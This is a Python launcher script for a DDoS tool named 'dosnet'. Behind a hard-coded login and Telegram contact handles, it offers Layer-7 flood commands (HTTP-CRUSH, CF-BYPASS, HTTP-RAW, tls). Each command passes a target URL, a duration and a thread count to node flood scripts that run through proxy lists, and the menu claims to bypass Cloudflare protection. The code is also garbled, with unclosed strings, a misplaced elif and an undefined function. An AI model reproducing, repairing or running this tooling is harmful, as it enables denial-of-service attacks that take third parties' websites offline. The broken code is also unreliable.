import subprocess
import os
import time
import socket
import requests
import random
import getpass
import sys
import json
import platform
import colorama
from node_modules.colors.themes import string

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (169, 169, 169)
end_color = (255, 255, 255)

class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	WH = colorama.Fore.LIGHTWHITE_EX
	GR = colorama.Fore.LIGHTBLACK_EX
	RESET = colorama.Fore.RESET
	
def menu():
    clear()
    banner = r"""
                          :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~

"""
    author = r"""
		t.me/r0xxy0 & t.me/Tegarzzzz
    """
    prints(start_color, end_color, banner)
    prints(end_color, start_color, author)
def layer7():
    clear()
    banner = r"""
                          :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~

"""
    author = r"""
		t.me/r0xxy0 & t.me/Tegarzzzz
    """
    prints(start_color, end_color, banner)
    prints(start_color, end_color, author)
    print("\n") 
    print(Color.GR+"      ["+Color.WH+"HTTPS-CRUSH"+Color.GR+"]"+Color.WH+" Bypass"+Color.GR+"       ["+Color.WH+"CF-BYPASS"+Color.GR+"]"+Color.WH+" Bypass")
    print("\n") 
    print(Color.GR+"      ["+Color.WH+"HTTP-RAW"+Color.GR+"]"+Color.WH+" Only-HTTP"+Color.GR+"       ["+Color.WH+"tls"+Color.GR+"]"+Color.WH+" Big Request")
    print("\n")
def main():
    menu()
    while True:
        cnc = input(Color.GR+"╔═══"+Color.GR+"["+Color.GR+"root"+Color.WH+"@"+Color.GR+"dosnet"+Color.GR+"]"+Color.GR+"\n╚══> "+Color.RESET)
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "\4" or cnc == "l4":
            layer4()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
            
#Layer-7 Priv Method By dosnet
        elif "HTTP-CRUSH" in cnc:
            try:
                method = cnc.split()[1]
                url = cnc.split()[2]
                time = cnc.split()[3]
                th = cnc.split()[4]
                os.system(f'node crush.js {method} {url} proxies.txt {time} 64 {th}')
            except IndexError:
                print('Usage: HTTP-CRUSH <GET/POST> <URL> <TIME> <THREADS>')
                print('Example: HTTP-CRUSH GET https://example 60 100')
                
        elif "CF-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                th = cnc.split()[3]
                os.system(f'node CF-BYPASS.js {url} {time} 64 {th} proxies.txt')
            except IndexError:
                print('Usage: CF-BYPASS <url> <time> <threads>')
                print('Example: CF-BYPASS https://example.com 60 100')
                
        elif "HTTP-RAW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node CF-BYPASS.js {url} {time}')
            except IndexError:
                print('Usage: HTTP-RAW <url> <time>')
                print('Example: HTTP-RAW https://example.com 60)
                
                elif "tls" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                th = cnc.split()[3]
                os.system(f'node live.js {url} {time} {th} 64 proxies.txt')
            except IndexError:
                print('Usage: tls <url> <time> <threads>')
                print('Example: tls https://example.com 60 50)
                
def login():
    clear()
    user = "admin"
    passwd = "admin"
    username = input(" Username : ")
    password = getpass.getpass(prompt=' Password : ')
    if username != user or password != passwd:
        print("")
        print("Get Your Password at t.me/r0xxyx or t.me/Tegarzzzz")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Success Login")
        print("Welcome To dosnet")
        time.sleep(0.3)
        clear()
        print("Redirecting To dosnet")
        time.sleep(0.5)
        main()

login()
